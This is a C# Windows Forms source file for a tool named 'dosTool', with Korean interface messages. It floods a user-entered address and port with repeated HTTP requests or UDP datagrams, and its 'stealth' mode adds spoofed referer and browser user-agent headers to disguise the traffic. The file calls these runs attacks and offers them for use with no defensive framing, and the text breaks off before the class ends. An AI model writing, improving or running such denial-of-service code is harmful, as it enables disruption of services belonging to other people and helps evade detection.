using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace dosTool
{
    public partial class Form1 : Form
    {
        private bool _canceled;
        private bool _isChanged;
        private bool _isTcp;
        private bool _ready;
        private bool _stealth;

        public Form1()
        {
            InitializeComponent();
        }

        private void TcpDos(string address, int port, bool stealth, bool noPort = false)
        {
            _canceled = false;
            _ready = true;

            try
            {
                for (;;)
                {
                    if (_canceled)
                    {
                        _canceled = false;
                        _ready = false;

                        richTextBox1.AppendText($"[{DateTime.Now:tt hh:mm:ss}] [TCP] 공격이 취소됨\n");
                        break;
                    }

                    using (var webClient = new WebClient())
                    {
                        if (stealth)
                        {
                            webClient.Headers.Add("dnt", "1");
                            webClient.Headers.Add("referer", "https://google.com");
                            webClient.Headers.Add("user-agent",
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
                        }

                        webClient.DownloadString(noPort ? new Uri($"{address}") : new Uri($"{address}:{port}"));
                    }

                    richTextBox1.AppendText(noPort
                        ? $"[{DateTime.Now:tt hh:mm:ss}] [TCP] {address}으로 요청을 보냄\n"
                        : $"[{DateTime.Now:tt hh:mm:ss}] [TCP] {address}:{port}으로 요청을 보냄\n");

                    Delay(1000);
                }
            }
            catch (Exception e)
            {
                _ready = false;
                richTextBox1.AppendText($"[{DateTime.Now:tt hh:mm:ss}] [TCP] {e.Message}\n");
            }
        }

        private void UdpDos(string address, int port)
        {
            _canceled = false;
            _ready = true;

            try
            {
                for (;;)
                {
                    if (_canceled)
                    {
                        _canceled = false;
                        _ready = false;
                        richTextBox1.AppendText($"[{DateTime.Now:tt hh:mm:ss}] [UDP] 공격이 취소됨\n");

                        break;
                    }

                    byte[] dataGram = Encoding.UTF8.GetBytes(
                        "");

                    using (var udpClient = new UdpClient()) udpClient.Send(dataGram, dataGram.Length, address, port);

                    richTextBox1.AppendText(
                        $"[{DateTime.Now:tt hh:mm:ss}] [UDP] {address}:{port}으로 요청을 보냄\n");

                    Delay(1000);
                }
            }
            catch (Exception e)
            {
                _ready = false;
                richTextBox1.AppendText($"[{DateTime.Now:tt hh:mm:ss}] [UDP] {e.Message}\n");
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (_ready)
            {
                MessageBox.Show("이미 공격 중입니다.", "DosTool");
                return;
            }

            if (!checkBox1.Checked && !checkBox2.Checked)
            {
                MessageBox.Show("TCP 또은 UDP란을 선택해주세요");
                return;
            }

            var isHttps = false;
            var isNotHttpsHttp = false;
            var noPort = false;

            string addressPort = richTextBox2.Text;

            if (addressPort.Contains("https://"))
            {
                isHttps = true;
                addressPort = addressPort.Replace("https://", "");
            }
            else if (addressPort.Contains("http://"))
                addressPort = addressPort.Replace("http://", "");
            else
                isNotHttpsHttp = true;

            if (addressPort.Replace(":", "").Trim().Length == 0 || addressPort == "주소:포트")
            {
                MessageBox.Show("주소와 포트가 올바르지 못합니다.", "DosTool");
                return;
            }

            if (!addressPort.Contains(":")) noPort = true;

            string[] richTextBox2Split = addressPort.Split(':');

            string address = richTextBox2Split[0];

            if (address == "주소" || string.IsNullOrEmpty(address))
            {
                MessageBox.Show("주소를 입력해주세요", "DosTool");
                return;
            }

            if (noPort)
            {
                if (!_isTcp)
                {
                    MessageBox.Show("UDP 공격은 포트를 입력해야합니다.", "DosTool");
                    return;
                }

                TcpDos(isNotHttpsHttp ? $"http://{address}" : address, 0, _stealth, true);

                return;
            }

            if (!int.TryParse(richTextBox2Split[1], out int port))
            {
                MessageBox.Show("포트가 올바르지 못합니다.", "DosTool");
                return;
            }

            if (port.ToString() == "포트" || string.IsNullOrEmpty(port.ToString()))
            {
                MessageBox.Show("포트를 입력해주세요", "DosTool");
                return;
            }

            if (!_isTcp && _stealth)
            {
                DialogResult result = MessageBox.Show(
                    "UDP 공격은 스텔스 기능이 작동하지 않습니다.\n그래도 실행하시겠습니까?",
                    "DosTool", MessageBoxButtons.YesNo);

                if (result == DialogResult.No)
                    return;
            }

            if (_isTcp)
                TcpDos(isHttps ? $"https://{address}" : $"http://{address}", port, _stealth);
            else
                UdpDos(address, port);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            _canceled = true;
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (_isChanged)
            {
                _isChanged = false;
                return;
            }

            if (checkBox2.Checked)
            {
                _isChanged = true;
                checkBox2.Checked = false;
            }

            _isTcp = true;
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (_isChanged)
            {
                _isChanged = false;
                return;
            }

            if (checkBox1.Checked)
            {
                _isChanged = true;
                checkBox1.Checked = false;
            }

            _isTcp = false;
        }

        private static void Delay(int ms)
        {
            DateTime thisMoment = DateTime.Now;
            var duration = new TimeSpan(0, 0, 0, 0, ms);
            DateTime afterWards = thisMoment.Add(duration);

            while (afterWards >= thisMoment)
            {
                Application.DoEvents();
                thisMoment = DateTime.Now;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            richTextBox1.Clear();
        }

